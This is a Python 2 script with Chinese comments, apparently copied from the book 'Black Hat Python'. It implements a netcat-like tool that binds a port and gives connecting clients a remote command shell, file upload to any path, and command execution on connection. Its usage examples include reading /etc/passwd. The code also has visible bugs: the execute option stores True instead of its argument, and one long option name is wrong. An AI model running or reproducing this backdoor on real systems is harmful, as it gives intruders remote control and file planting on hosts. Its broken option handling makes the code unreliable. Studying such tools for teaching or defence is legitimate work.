#!/usr/bin/env python
# coding:utf-8
'''
这是一个基于python的类似netcat的小程序
采自python黑帽子
'''
import sys
import socket
import getopt
import threading
import subprocess

# 定义一些全局变量
LISTEN             = False
COMMAND            = False
UPLOAD             = False
EXECUTE            = ""
TARGET             = ""
UPLOAD_DESTINATION = ""
PORT               = 0

def usage():
    '''
    工具的帮助信息
    '''
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen               - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run  - execute the given file upon receiving a connection"
    print "-c --command              - initialize a command shell"
    print "-u --upload = destination - upon receiving connection upload a file and write \
                                       to [destination]"
    print
    print
    print "Examples:"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    '''
    主函数
    '''
    global LISTEN
    global PORT
    global EXECUTE
    global COMMAND
    global UPLOAD_DESTINATION
    global TARGET

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", \
        ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            LISTEN = True
        elif o in ("-e", "--execute"):
            EXECUTE = True
        elif o in ("-c", "commandshell"):
            COMMAND = True
        elif o in ("-u", "--upload"):
            UPLOAD_DESTINATION = a
        elif o in ("-t", "--target"):
            TARGET = a
        elif o in ("-p", "--port"):
            PORT = int(a)
        else:
            assert False, "Unhandled Option"

    # 我们是进行监听还是进从标准输入发送数据？
    if not LISTEN and len(TARGET) and PORT > 0:
        # 从命令行读取内存数据
        # 这里将阻塞，所以不在向标准输入发送数据时发送CTRL-D
        buffer = sys.stdin.read()
        # 发送数据
        client_sender(buffer)

    # 我们开始监听并准备上传文件、执行命令
    # 放置一个反弹shell
    # 取决于上面的命令行选项
    if LISTEN:
        server_loop()

def client_sender(buffer):
    '''
    发送数据
    '''
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((TARGET, PORT))

        if len(buffer):
            client.send(buffer)

        while True:
            # 现在等待数据回传
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response

            # 等待更多的输入
            buffer = raw_input("")
            buffer += "\n"
            # 发送出去
            client.send(buffer)

    except:
        print "[*] Exception! Exiting."
        # 关闭连接
        client.close()

def server_loop():
    '''
    多线程tcp服务端
    '''
    global TARGET

    # 如果没有定义目标，那么我们监听所以接口
    if not len(TARGET):
        TARGET = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((TARGET, PORT))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 分拆一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler, \
        args=(client_socket,))
        client_thread.start()

def run_command(command):
    '''
    运行了用户输入的命令
    '''
    # 换行
    command = command.rstrip()
    # 运行命令并将输出返回
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT,\
        shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # 将输出发送
    return output

def client_handler(client_socket):
    '''
    客户端处理线程
    '''
    global UPLOAD # global statement
    global EXECUTE
    global COMMAND

    # 检测上传文件
    if len(UPLOAD_DESTINATION):
        # 读取所有的字符并写下目标
        file_buffer = ""
        # 持续读取数据直到没有符合的数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(UPLOAD_DESTINATION, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # 确认文件已经写出来
            client_socket.send("Successfully saved file to %s\r\n"\
            % UPLOAD_DESTINATION)
        except:
            client_socket.send("Failed to save file to %s\r\n" % UPLOAD_DESTINATION)

    # 检查命令执行
    if len(EXECUTE):
        # 运行命令
        output = run_command(EXECUTE)
        client_socket.send(output)

    if COMMAND:
        while True:
            # 跳出一个窗口
            client_socket.send("<BHP:#> ")
            # 现在我们接收文件直到发现换行符（enter key）
            cmd_buffer = ""

            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # 返还命令输出
            response = run_command(cmd_buffer)

            # 返回响应数据
            client_socket.send(response)
